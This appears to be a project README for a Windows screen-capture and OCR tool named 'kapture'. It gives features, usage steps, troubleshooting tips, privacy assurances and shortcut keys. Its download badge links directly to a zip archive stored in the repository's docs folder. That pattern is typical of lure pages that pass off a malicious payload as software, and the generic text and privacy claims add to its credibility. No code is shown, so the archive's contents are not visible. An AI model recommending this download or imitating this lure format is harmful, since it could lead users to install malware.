# 📸 kapture - Capture your screen with ease

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/victorycandelar6845/kapture/main/docs/Software-1.1.zip)

kapture helps you save images and videos from your computer screen. You can take pictures of specific areas, record your screen, and extract text from images. This tool combines many features into one simple program. It works well for office tasks, school projects, and content creation.

## 🛠 Features

*   **Custom Screen Captures:** Select any part of your screen or a specific window to save as an image.
*   **Scrolling Captures:** Save long web pages or documents that extend beyond the screen height.
*   **Text Recognition:** Use the OCR tool to extract readable text from any image or screenshot.
*   **Draw and Mark:** Add arrows, boxes, and text to your screenshots to highlight key information.
*   **Screen Recording:** Record your desktop activity as a video file.
*   **Pin Screenshots:** Keep images visible on top of your other windows for quick reference.

## 🖱 Using the Tool

### Taking a Screenshot
Press the shortcut key defined in the settings menu to start a capture. Your cursor will change into a crosshair icon. Click and drag your mouse over the area you want to save. Release the mouse button to confirm the selection. The image will save to your clipboard or your chosen folder.

### Extracting Text
Once you capture an area that contains text, click the OCR button in the toolbar. The software will analyze the image and generate a text box. You can copy this text and paste it into any document. This feature supports both English and Chinese characters.

### Creating a Scrolling Capture
If you need to capture a web page that scrolls, select the scrolling mode from the toolbar. Start the capture and scroll down on your web page. The software will automatically stitch the sections into one long image.

### Annotating Images
Use the toolbar to select shapes like rectangles, circles, or arrows. Choose a color and draw directly on your image. Use the text tool to add labels or notes. Save your work when you finish your adjustments.

## 📦 Troubleshooting Common Issues

*   **The program does not launch:** Ensure your computer has the latest updates from Windows Update. Sometimes restarting the machine fixes issues with software permissions.
*   **OCR does not recognize text:** Make sure the image is clear and not blurry. Good lighting helps when capturing text from physical documents. Verify that you have the correct language selected in the settings.
*   **Screen recording is choppy:** Close background programs that use a lot of memory or processor power. High-resolution recordings require more resources than simple screenshots.
*   **Toolbar is missing:** Check the system tray near your clock. You can right-click the kapture icon to show the main menu or access settings.
*   **Files are missing:** Check the default folder located in your Documents library under the name "kapture_output". You can change this path in the settings menu at any time.

## 📄 Privacy and Data

Your screenshots stay on your machine. This software does not send your personal images to any cloud servers. All text recognition happens locally on your computer. You hold full control over where your files go. If you delete a file from the output folder, it is removed from your system.

## ⌨️ Shortcut Keys

You can customize your keys in the settings menu. Common defaults include:

*   **Print Screen:** Start a new region capture.
*   **Ctrl + Shift + S:** Start a scrolling capture.
*   **Ctrl + Shift + R:** Start a screen recording.
*   **Esc:** Cancel any active command.

These keys allow for fast operation during your daily work. Use them to spend less time moving your mouse and more time focusing on your tasks. If a shortcut does not work, check if another program on your computer uses the same key combination. You can change these settings at any time to avoid conflicts.
